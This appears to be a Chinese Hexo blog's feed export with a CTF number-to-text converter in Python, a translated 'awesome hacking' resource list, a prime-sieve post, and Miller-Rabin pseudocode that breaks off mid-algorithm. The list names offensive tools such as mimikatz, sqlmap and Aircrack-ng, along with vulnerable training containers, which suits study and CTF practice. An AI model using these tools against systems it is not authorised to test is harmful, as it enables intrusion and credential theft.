class="keyword">return</span> data</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_detect</span><span class="params">(num_str)</span>:</span></div><div class="line">    hexadecimal_feature = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>, <span class="string">'E'</span>, <span class="string">'F'</span>]</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> hexadecimal_feature:</div><div class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> num_str:</div><div class="line">            print(<span class="string">'[*] You may enter a hexadecimal numeric string.'</span>)</div><div class="line">            <span class="keyword">return</span> <span class="number">16</span></div><div class="line">    <span class="keyword">if</span> max(num_str) == <span class="string">'1'</span>:</div><div class="line">        print(<span class="string">'[*] You may enter a binary numeric string.'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">2</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">'[*] You may enter a decimal numeric string.'</span>)</div><div class="line">        <span class="keyword">return</span> <span class="number">10</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_to_text</span><span class="params">(num_str)</span>:</span></div><div class="line">    lens = len(num_str)</div><div class="line">    text = <span class="string">''</span></div><div class="line">    count = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> count &lt; lens:</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            text += chr(int(num_str[:<span class="number">8</span>], <span class="number">2</span>))</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">            print_error()</div><div class="line">        count += <span class="number">8</span></div><div class="line">        num_str = num_str[<span class="number">8</span>:]</div><div class="line">    print(<span class="string">'[&gt;] Output convert result:%s'</span> %text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decimal_to_text</span><span class="params">(num_str)</span>:</span></div><div class="line">    lens = len(num_str)</div><div class="line">    text = <span class="string">''</span></div><div class="line">    count = <span class="number">0</span></div><div class="line">    <span class="keyword">while</span> count &lt; lens:</div><div class="line">        <span class="keyword">if</span> int(num_str[:<span class="number">2</span>]) &gt;= <span class="number">32</span> <span class="keyword">and</span> int(num_str[:<span class="number">2</span>]) &lt;= <span class="number">126</span>:</div><div class="line">            text += chr(int(num_str[:<span class="number">2</span>]))</div><div class="line">            count += <span class="number">2</span></div><div class="line">            num_str = num_str[<span class="number">2</span>:]</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">elif</span> int(num_str[:<span class="number">3</span>]) &gt;= <span class="number">32</span> <span class="keyword">and</span> int(num_str[:<span class="number">3</span>]) &lt;= <span class="number">126</span>:</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                text += chr(int(num_str[:<span class="number">3</span>]))</div><div class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">                print_error()</div><div class="line">            count += <span class="number">3</span></div><div class="line">            num_str = num_str[<span class="number">3</span>:]</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            print_error()</div><div class="line">    print(<span class="string">'[&gt;] Output convert result:%s'</span> %text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexadecimal_to_text</span><span class="params">(num_str)</span>:</span></div><div class="line">    lens = len(num_str)</div><div class="line">    <span class="keyword">if</span> lens % <span class="number">2</span> != <span class="number">0</span>:</div><div class="line">        print_error()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        text = num_str.decode(<span class="string">'hex'</span>)</div><div class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</div><div class="line">        print_error()</div><div class="line">    print(<span class="string">'[&gt;] Output convert result:%s'</span> %text)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    num_str = input_filter()</div><div class="line">    det_res = input_detect(num_str)</div><div class="line">    <span class="keyword">if</span> det_res == <span class="number">2</span>:</div><div class="line">        binary_to_text(num_str)</div><div class="line">    <span class="keyword">if</span> det_res == <span class="number">10</span>:</div><div class="line">        decimal_to_text(num_str)</div><div class="line">    <span class="keyword">if</span> det_res == <span class="number">16</span>:</div><div class="line">        hexadecimal_to_text(num_str)</div><div class="line">    </div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> python </tag>
            
            <tag> 数字串转字符串 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[超棒黑客必备清单]]></title>
      <url>/2017/04/07/%E8%B6%85%E6%A3%92%E9%BB%91%E5%AE%A2%E5%BF%85%E5%A4%87%E6%B8%85%E5%8D%95/</url>
      <content type="html"><![CDATA[<h1 id="超棒黑客必备清单"><a href="#超棒黑客必备清单" class="headerlink" title="超棒黑客必备清单 "></a>超棒黑客必备清单 <a href="https://github.com/sindresorhus/awesome" target="_blank" rel="external"><img src="https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg" alt="Awesome"></a></h1><p><a href="https://github.com/carpedm20/awesome-hacking" target="_blank" rel="external">English Version</a></p><p>一份精美的黑客必备表单,灵感来自于<a href="https://github.com/josephmisiti/awesome-machine-learning/" target="_blank" rel="external">超棒的机器学习</a>，如果您想为此列表做出贡献（欢迎），请在github给我一个pull或联系我<a href="https://twitter.com/carpedm20" target="_blank" rel="external">@carpedm20</a>，有关可供下载的免费黑客书籍列表，请点击<a href="https://github.com/Hack-with-Github/Free-Security-eBooks" target="_blank" rel="external">此处</a>。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li><a href="#系统方面">系统方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li><li><a href="#docker">Docker</a></li><li><a href="#常用">常用</a></li></ul></li><li><a href="#逆向方面">逆向方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li><li><a href="#常用">常用</a></li></ul></li><li><a href="#web">Web方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#网络方面">网络方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#取证方面">取证方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#密码方面">密码方面</a><ul><li><a href="#教程">教程</a></li><li><a href="#工具">工具</a></li></ul></li><li><a href="#wargame方面">Wargame方面</a><ul><li><a href="#系统">系统</a></li><li><a href="#逆向工程">逆向工程</a></li><li><a href="#web">Web</a></li><li><a href="#网络">网络</a></li><li><a href="#取证">取证</a></li><li><a href="#密码学">密码学</a></li></ul></li><li><a href="#ctf">CTF方面</a><ul><li><a href="#比赛">比赛</a></li><li><a href="#常用">常用</a></li></ul></li><li><a href="#os安全方面">OS安全方面</a><ul><li><a href="#在线资源">在线资源</a></li></ul></li><li><a href="#其他">其他</a></li></ul><a id="more"></a><h1 id="系统方面"><a href="#系统方面" class="headerlink" title="系统方面"></a>系统方面</h1><h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><ul><li><a href="https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/" target="_blank" rel="external">Corelan团队的Exploit写作教程</a></li><li><a href="http://www.punter-infosec.com/exploit-writing-tutorials-for-pentesters/" target="_blank" rel="external">为渗透测试员开发的Exploit写作教程</a></li></ul><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/rapid7/metasploit-framework" target="_blank" rel="external">Metasploit</a> - 一个计算机安全项目，提供有关安全漏洞的信息，并帮助进行渗透测试和入侵检测系统开发。</li><li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="external">mimikatz</a> - 一个玩Windows安全有用的工具</li></ul><h3 id="有关渗透测试和安全方面的Docker镜像"><a href="#有关渗透测试和安全方面的Docker镜像" class="headerlink" title="有关渗透测试和安全方面的Docker镜像"></a>有关渗透测试和安全方面的Docker镜像</h3><ul><li><code>docker pull kalilinux/kali-linux-docker</code> <a href="https://hub.docker.com/r/kalilinux/kali-linux-docker/" target="_blank" rel="external">official Kali Linux</a></li><li><code>docker pull owasp/zap2docker-stable</code> - <a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="external">official OWASP ZAP</a></li><li><code>docker pull wpscanteam/wpscan</code> - <a href="https://hub.docker.com/r/wpscanteam/wpscan/" target="_blank" rel="external">official WPScan</a></li><li><code>docker pull pandrew/metasploit</code> - <a href="https://hub.docker.com/r/pandrew/metasploit/" target="_blank" rel="external">docker-metasploit</a></li><li><code>docker pull citizenstig/dvwa</code> - <a href="https://hub.docker.com/r/citizenstig/dvwa/" target="_blank" rel="external">Damn Vulnerable Web Application (DVWA)</a></li><li><code>docker pull wpscanteam/vulnerablewordpress</code> - <a href="https://hub.docker.com/r/wpscanteam/vulnerablewordpress/" target="_blank" rel="external">Vulnerable WordPress Installation</a></li><li><code>docker pull hmlio/vaas-cve-2014-6271</code> - <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-6271/" target="_blank" rel="external">Vulnerability as a service: Shellshock</a></li><li><code>docker pull hmlio/vaas-cve-2014-0160</code> - <a href="https://hub.docker.com/r/hmlio/vaas-cve-2014-0160/" target="_blank" rel="external">Vulnerability as a service: Heartbleed</a></li><li><code>docker pull opendns/security-ninjas</code> - <a href="https://hub.docker.com/r/opendns/security-ninjas/" target="_blank" rel="external">Security Ninjas</a></li><li><code>docker pull usertaken/archlinux-pentest-lxde</code> - <a href="https://hub.docker.com/r/usertaken/archlinux-pentest-lxde/" target="_blank" rel="external">Arch Linux Penetration Tester</a></li><li><code>docker pull diogomonica/docker-bench-security</code> - <a href="https://hub.docker.com/r/diogomonica/docker-bench-security/" target="_blank" rel="external">Docker Bench for Security</a></li><li><code>docker pull ismisepaul/securityshepherd</code> - <a href="https://hub.docker.com/r/ismisepaul/securityshepherd/" target="_blank" rel="external">OWASP Security Shepherd</a></li><li><code>docker pull danmx/docker-owasp-webgoat</code> - <a href="https://hub.docker.com/r/danmx/docker-owasp-webgoat/" target="_blank" rel="external">OWASP WebGoat Project docker image</a></li><li><code>docker-compose build &amp;&amp; docker-compose up</code> - <a href="https://github.com/owasp/nodegoat#option-3---run-nodegoat-on-docker" target="_blank" rel="external">OWASP NodeGoat</a></li><li><code>docker pull citizenstig/nowasp</code> - <a href="https://hub.docker.com/r/citizenstig/nowasp/" target="_blank" rel="external">OWASP Mutillidae II Web Pen-Test Practice Application</a></li><li><code>docker pull bkimminich/juice-shop</code> - <a href="https://github.com/bkimminich/juice-shop#docker-container--" target="_blank" rel="external">OWASP Juice Shop</a></li></ul><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><ul><li><a href="https://www.exploit-db.com/" target="_blank" rel="external">Exploit database</a> - 漏洞利用和易受攻击软件的终极存档库</li></ul><h1 id="逆向方面"><a href="#逆向方面" class="headerlink" title="逆向方面"></a>逆向方面</h1><h2 id="教程-1"><a href="#教程-1" class="headerlink" title="教程"></a>教程</h2><ul><li><a href="https://tuts4you.com/download.php?list.17" target="_blank" rel="external">逆转新手</a></li><li><a href="http://fumalwareanalysis.blogspot.kr/p/malware-analysis-tutorials-reverse.html" target="_blank" rel="external">恶意软件分析教程：逆向工程</a></li></ul><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/lorenzoongithub/nudge4j" target="_blank" rel="external">nudge4j</a> - 让浏览器与JVM交互的Java工具</li><li><a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="external">IDA</a> - IDA是可以工作在Windows，Linux或Mac OS X的多处理反汇编和调试工具</li><li><a href="http://www.ollydbg.de/" target="_blank" rel="external">OllyDbg</a> - Windows 32位汇编程序级别调试工具</li><li><a href="http://x64dbg.com/" target="_blank" rel="external">x64dbg</a> - Windows上开源x64/x32调试工具</li><li><a href="https://github.com/pxb1988/dex2jar" target="_blank" rel="external">dex2jar</a> - 用于处理用于处理Android .dex和Java .class文件的工具</li><li><a href="http://jd.benow.ca/" target="_blank" rel="external">JD-GUI</a> - 显示Java源代码“.class”文件的独立图形实用工具</li><li><a href="https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler" target="_blank" rel="external">procyon</a> - 现代化开源Java反编译工具</li><li><a href="https://code.google.com/p/androguard/" target="_blank" rel="external">androguard</a> - 用于Android应用程序的逆向工程，恶意软件分析工具</li><li><a href="http://varaneckas.com/jad/" target="_blank" rel="external">JAD</a> - JAD Java反编译工具(闭源, 不常更新)</li><li><a href="https://www.jetbrains.com/decompiler/" target="_blank" rel="external">dotPeek</a> - JetBrains公司开发的免费的.NET反编译工具</li><li><a href="https://github.com/icsharpcode/ILSpy/" target="_blank" rel="external">ILSpy</a> - 开源的集浏览和反编译.NET程序工具</li><li><a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="external">dnSpy</a> - 集编辑，反编译和调试.NET程序工具</li><li><a href="https://github.com/0xd4d/de4dot" target="_blank" rel="external">de4dot</a> - 破解.NET程序工具</li><li><a href="https://github.com/0xd4d/antinet" target="_blank" rel="external">antinet</a> - 用于反编译和混淆代码的.NET程序工具</li><li><a href="http://upx.sourceforge.net/" target="_blank" rel="external">UPX</a> - 终极封装可执行文件工具</li><li><a href="https://github.com/radare/radare2" target="_blank" rel="external">radare2</a> - 便携式的逆向工程框架工具</li><li><a href="https://github.com/joelpx/plasma" target="_blank" rel="external">plasma</a> - 适用于x86/ARM/MIPS交互式反汇编，使用花指令语法代码生成伪代码。</li><li><a href="https://www.hopperapp.com" target="_blank" rel="external">Hopper</a> - 适用于OS X和Linux反汇编/反编译32/64位Windows/MAC/LINUX/iOS的可执行文件工具</li><li><a href="https://github.com/pfalcon/ScratchABit" target="_blank" rel="external">ScratchABit</a> - 使用IDAPython兼容插件API轻松重新定位和可攻击的交互式反汇编工具</li></ul><h2 id="常用-1"><a href="#常用-1" class="headerlink" title="常用"></a>常用</h2><ul><li><a href="http://www.offensivecomputing.net/" target="_blank" rel="external">开放的恶意软件查询</a></li></ul><h1 id="Web方面"><a href="#Web方面" class="headerlink" title="Web方面"></a>Web方面</h1><h2 id="工具-2"><a href="#工具-2" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="external">sqlmap</a> - 自动SQL注入和数据库入侵工具</li><li><a href="http://tools.web-max.ca/encode_decode.php" target="_blank" rel="external">tools.web-max.ca</a> - base64，base85编码/解码</li></ul><h1 id="网络方面"><a href="#网络方面" class="headerlink" title="网络方面"></a>网络方面</h1><h2 id="工具-3"><a href="#工具-3" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a> - 免费开源的流量包分析工具</li><li><a href="http://www.netresec.com/?page=NetworkMiner" target="_blank" rel="external">NetworkMiner</a> - 网络取证分析工具</li><li><a href="http://www.tcpdump.org/" target="_blank" rel="external">tcpdump</a> - 功能强大的命令行流量包分析工具，自带的libpcap用于网络流量捕获的便携式C/C++库</li><li><a href="http://sourceforge.net/projects/paros/" target="_blank" rel="external">Paros</a> - 基于Java的HTTP/HTTPS代理用于评估Web应用程序漏洞工具</li><li><a href="https://github.com/rafael-santiago/pig" target="_blank" rel="external">pig</a> - Linux下伪造流量包工具</li><li><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="external">ZAP</a> - ZAP是用于发现Web应用程序中漏洞易于使用的集成式渗透测试工具</li><li><a href="https://mitmproxy.org/" target="_blank" rel="external">mitmproxy</a> - 基于HTTP具有交互式控制界面并支持SSL中间代理的工具</li><li><a href="https://github.com/Akdeniz/mitmsocks4j" target="_blank" rel="external">mitmsocks4j</a> - 基于Java支持中间SOCKS代理工具</li><li><a href="https://nmap.org/" target="_blank" rel="external">nmap</a> - Nmap安全扫描工具</li><li><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack-ng</a> - 用于破解802.11 WEP和WPA-PSK密钥工具</li><li><a href="https://charlesproxy.com" target="_blank" rel="external">Charles Proxy</a> - 用于查看截获的HTTP和HTTPS/SSL实时流量的跨平台图形化用户界面Web调试代理工具</li><li><a href="https://github.com/GouveaHeitor/nipe" target="_blank" rel="external">Nipe</a> - 使Tor网络成为默认网关的脚本</li></ul><h1 id="取证方面"><a href="#取证方面" class="headerlink" title="取证方面"></a>取证方面</h1><h2 id="工具-4"><a href="#工具-4" class="headerlink" title="工具"></a>工具</h2><ul><li><a href="http://www.sleuthkit.org/autopsy/" target="_blank" rel="external">Autospy</a> - 数字取证平台，<a href="http://www.sleuthkit.org/sleuthkit/index.php" target="_blank" rel="external">The Sleuth Kit</a>的图形界面，还包含其他数字取证工具。</li><li><a href="https://github.com/sleuthkit/sleuthkit" target="_blank" rel="external">sleuthkit</a> - 收集各种命令行数字取证工具库</li><li><a href="https://www.guidancesoftware.com/products/Pages/encase-forensic/overview.aspx" target="_blank" rel="external">EnCase</a> - Guidance Software开发的一套使用共享技术数字取证工具</li><li><a href="http://malzilla.sourceforge.net/" target="_blank" rel="external">malzilla</a> - 恶意软件抓捕工具</li><li><a href="http://wjradburn.com/software/" target="_blank" rel="external">PEview</a> - 快速简便查看程序结构和32位可移植可执行文件（PE）以及组件对象文件格式（COFF）文件的内容</li><li><a href="http://mh-nexus.de/en/hxd/" target="_blank" rel="external">HxD</a> - 十六进制编辑器，除了主存储器（RAM）的原始磁盘编辑和修改之外，可以处理任何大小的文件。</li><li><a href="http://www.winhex.com/winhex/" target="_blank" rel="external">WinHex</a> - 十六进制编辑器，有助于计算机取证，数据恢复，低级数据处理和IT安全领域。</li><li><a href="http://www.mcafee.com/kr/downloads/free-tools/bintext.aspx" target="_blank" rel="external">BinText</a> - 一个小而快强大的文本提取器，程序员特别感兴趣。</li></ul><h1 id="密码方面"><a href="#密码方面" class="headerlink" title="密码方面"></a>密码方面</h1><h3 id="工具-5"><a href="#工具-5" class="headerlink" title="工具"></a>工具</h3><ul><li><a href="https://github.com/hellman/xortool" target="_blank" rel="external">xortool</a> - 一种分析多字节XOR密码工具</li><li><a href="http://www.openwall.com/john/" target="_blank" rel="external">John the Ripper</a> - 快速密码破解工具</li><li><a href="http://www.aircrack-ng.org/" target="_blank" rel="external">Aircrack</a> - 802.11 WEP和WPA-PSK密钥破解工具</li></ul><h1 id="Wargame方面"><a href="#Wargame方面" class="headerlink" title="Wargame方面"></a>Wargame方面</h1><h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><ul><li><a href="http://overthewire.org/wargames/semtex/" target="_blank" rel="external">OverTheWire - Semtex</a></li><li><a href="http://overthewire.org/wargames/vortex/" target="_blank" rel="external">OverTheWire - Vortex</a></li><li><a href="http://overthewire.org/wargames/drifter/" target="_blank" rel="external">OverTheWire - Drifter</a></li><li><a href="http://pwnable.kr/" target="_blank" rel="external">pwnable.kr</a> - 提供有关系统安全性的各种pwn挑战</li><li><a href="https://exploit-exercises.com/nebula/" target="_blank" rel="external">Exploit Exercises - Nebula</a></li><li><a href="http://smashthestack.org/" target="_blank" rel="external">SmashTheStack</a></li></ul><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><ul><li><a href="http://www.reversing.kr/" target="_blank" rel="external">Reversing.kr</a></li><li><a href="http://codeengn.com/challenges/" target="_blank" rel="external">CodeEngn</a></li><li><a href="http://simples.kr/" target="_blank" rel="external">simples.kr</a></li><li><a href="http://crackmes.de/" target="_blank" rel="external">Crackmes.de</a></li></ul><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><ul><li><a href="https://www.hackthissite.org/" target="_blank" rel="external">Hack This Site!</a></li><li><a href="http://webhacking.kr/" target="_blank" rel="external">Webhacking.kr</a></li><li><a href="https://0xf.at/" target="_blank" rel="external">0xf.at</a></li></ul><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><ul><li><a href="http://overthewire.org/wargames/krypton/" target="_blank" rel="external">OverTheWire - Krypton</a></li></ul><h1 id="CTF方面"><a href="#CTF方面" class="headerlink" title="CTF方面"></a>CTF方面</h1><h2 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h2><ul><li><a href="https://legitbs.net/" target="_blank" rel="external">DEF CON</a></li><li><a href="https://ctf.isis.poly.edu/" target="_blank" rel="external">CSAW CTF</a></li><li><a href="http://hack.lu/" target="_blank" rel="external">hack.lu CTF</a></li><li><a href="http://www.plaidctf.com/" target="_blank" rel="external">Pliad CTF</a></li><li><a href="http://ructf.org/e/" target="_blank" rel="external">RuCTFe</a></li><li><a href="http://ghostintheshellcode.com/" target="_blank" rel="external">Ghost in the Shellcode</a></li><li><a href="http://www.phdays.com/" target="_blank" rel="external">PHD CTF</a></li><li><a href="http://secuinside.com/" target="_blank" rel="external">SECUINSIDE CTF</a></li><li><a href="http://ctf.codegate.org/html/Main.html?lang=eng" target="_blank" rel="external">Codegate CTF</a></li><li><a href="http://bostonkeyparty.net/" target="_blank" rel="external">Boston Key Party CTF</a></li></ul><h2 id="常用-2"><a href="#常用-2" class="headerlink" title="常用"></a>常用</h2><ul><li><a href="https://ctftime.org/" target="_blank" rel="external">CTFtime.org</a></li><li><a href="http://www.wechall.net/" target="_blank" rel="external">WeChall</a></li><li><a href="http://shell-storm.org/repo/CTF/" target="_blank" rel="external">CTF archives (shell-storm)</a></li><li><a href="https://amzn.com/144962636X" target="_blank" rel="external">Rookit Arsenal</a></li><li><a href="https://github.com/coreb1t/awesome-pentest-cheat-sheets" target="_blank" rel="external">Pentest Cheat Sheets</a> - 渗透测试方面的干货</li><li><a href="https://github.com/k4m4/movies-for-hackers" target="_blank" rel="external">Movies For Hacker</a> - 每个黑客必须看的电影清单</li></ul><h1 id="OS安全方面"><a href="#OS安全方面" class="headerlink" title="OS安全方面"></a>OS安全方面</h1><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a>在线资源</h2><ul><li><a href="http://rawsec.ml/en/security-related-os/" target="_blank" rel="external">Security related Operating Systems @ Rawsec</a> - 完整的有关操作系统安全表单</li><li><a href="https://n0where.net/best-linux-penetration-testing-distributions/" target="_blank" rel="external">Best Linux Penetration Testing Distributions @ CyberPunk</a> - 渗透测试分工说明</li><li><a href="http://distrowatch.com/search.php?category=Security" target="_blank" rel="external">Security @ Distrowatch</a> - 致力于讨论，审核和保持更新开源操作系统的网站</li></ul><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li><a href="http://sectools.org/" target="_blank" rel="external">SecTools</a> - 前125名网络安全工具</li></ul>]]></content>
      
        <categories>
            
            <category> 干货分享 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> awesome </tag>
            
            <tag> 取证 </tag>
            
            <tag> 黑客 </tag>
            
            <tag> 密码 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 逆向工程 </tag>
            
            <tag> 系统安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python实现基于埃拉托斯特尼筛法快速生成素数的优化]]></title>
      <url>/2017/03/26/python%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E5%9F%83%E6%8B%89%E6%89%98%E6%96%AF%E7%89%B9%E5%B0%BC%E7%AD%9B%E6%B3%95%E5%BF%AB%E9%80%9F%E7%94%9F%E6%88%90%E7%B4%A0%E6%95%B0%E7%9A%84%E4%BC%98%E5%8C%96/</url>
      <content type="html"><![CDATA[<h2 id="0x00-埃拉托斯特尼筛法"><a href="#0x00-埃拉托斯特尼筛法" class="headerlink" title="0x00 埃拉托斯特尼筛法"></a>0x00 埃拉托斯特尼筛法</h2><p><a href="http://baike.baidu.com/item/%E5%9F%83%E6%8B%89%E6%89%98%E6%96%AF%E7%89%B9%E5%B0%BC%E7%AD%9B%E6%B3%95" target="_blank" rel="external">埃拉托斯特尼筛法</a>，也就是我们常说的素数筛选法的一种方法：</p><p><img src="http://i.imgur.com/tm7E388.gif" alt=""></p><h2 id="0x02-优化"><a href="#0x02-优化" class="headerlink" title="0x02 优化"></a>0x02 优化</h2><p>使用了python的生成器方法生成一个超大的字典，这样做的方法是为了减少内存的消耗，循环只需到n的平方根square_root就行了，然后测试一下，最大的8位数基本40s能求出所有质因子。用到一些小优化，在python 2 中<code>while 1：</code>要比<code>while True：</code>要快，<code>if value：</code>要比<code>if value == True：</code>，不相信的话可以测试一下，然后看一下它们生成的操作码，另外大数计算中最好不用<code>for</code>循环，而用<code>while</code>循环。</p><h2 id="0x02-实现"><a href="#0x02-实现" class="headerlink" title="0x02 实现"></a>0x02 实现</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># author:admin[@hackfun.org]</span></div><div class="line"><span class="comment"># license:GPL v3</span></div><div class="line"><span class="comment"># blog:hackfun.org</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_super_dict</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""use python generator to generate super dictionary and save memory"""</span></div><div class="line">    i = <span class="number">2</span> <span class="comment"># 0 and 1 is not prime</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> i &gt; n:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        <span class="keyword">yield</span> i</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_prime_list</span><span class="params">(n)</span>:</span></div><div class="line">    <span class="string">"""use prime screen method to generate all prime numbers less than n"""</span></div><div class="line">    super_dict = &#123;&#125;</div><div class="line">    primes_list = []</div><div class="line"></div><div class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> gen_super_dict(n):</div><div class="line">        super_dict[x] = <span class="keyword">True</span></div><div class="line"></div><div class="line">    i = <span class="number">2</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        <span class="keyword">if</span> i &gt; n:</div><div class="line">            <span class="keyword">break</span></div><div class="line">        j = i * i</div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            <span class="keyword">if</span> j &gt; n:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> super_dict[i]:</div><div class="line">                super_dict[j] = <span class="keyword">False</span></div><div class="line">            j += i</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> key,value <span class="keyword">in</span> super_dict.items():</div><div class="line">        <span class="keyword">if</span> value:</div><div class="line">            primes_list.append(key)</div><div class="line">    <span class="keyword">return</span> primes_list</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 生成器方法生成超大字典 </tag>
            
            <tag> 埃拉托斯特尼筛法 </tag>
            
            <tag> 快速生成素数 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[python实现基于米勒拉宾素性检测算法最快的超大数素性检测]]></title>
      <url>/2017/03/26/python%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8E%E7%B1%B3%E5%8B%92%E6%8B%89%E5%AE%BE%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B%E7%AE%97%E6%B3%95%E6%9C%80%E5%BF%AB%E7%9A%84%E8%B6%85%E5%A4%A7%E6%95%B0%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/</url>
      <content type="html"><![CDATA[<h2 id="0x00-米勒拉宾素性检测算法伪代码"><a href="#0x00-米勒拉宾素性检测算法伪代码" class="headerlink" title="0x00 米勒拉宾素性检测算法伪代码"></a>0x00 米勒拉宾素性检测算法伪代码</h2><p><a href="https://en.wikipedia.org/wiki/Miller%E2%80%93Rabin_primality_test" target="_blank" rel="external">米勒拉宾素性检测</a>算法的伪代码：</p><pre><code>Input #1: n &gt; 3, an odd integer to be tested for primality;
Input #2: k, a parameter that determines the accuracy of the test
Output: composite if n is composite, otherwise probably prime
</code></pre><hr><pre><code>write n − 1 = (2 ^ r) * d with d odd by factoring powers of 2 from n − 1
WitnessLoop: repeat k times:
   pick a random integer a in the range [2, n − 2]
   x ← a^d mod n
   if x = 1 or x = n − 1 then
      continue WitnessLoop
   repeat r − 1 times:
      x ← x^2 mod n
